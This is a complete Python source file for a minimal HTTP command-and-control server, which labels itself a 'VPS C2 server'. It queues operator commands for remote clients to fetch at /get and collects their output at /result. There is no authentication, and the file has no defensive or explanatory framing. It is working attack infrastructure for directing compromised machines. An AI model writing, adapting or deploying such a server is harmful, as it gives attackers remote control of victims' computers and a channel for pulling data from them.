# control_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

pending_command = ""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        global pending_command
        path = urllib.parse.urlparse(self.path).path

        if path == "/get":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(pending_command.encode())
            pending_command = ""  # clear after sending

        elif path.startswith("/result"):
            query = urllib.parse.urlparse(self.path).query
            data = urllib.parse.parse_qs(query)
            print("Result from client:", data.get("r", [""])[0])
            self.send_response(200)
            self.end_headers()

        elif path.startswith("/cmd"):
            query = urllib.parse.urlparse(self.path).query
            data = urllib.parse.parse_qs(query)
            pending_command = data.get("c", [""])[0]
            print("New command set:", pending_command)
            self.send_response(200)
            self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

httpd = HTTPServer(('', 8080), Handler)
print("VPS C2 server running on port 8080")
httpd.serve_forever()
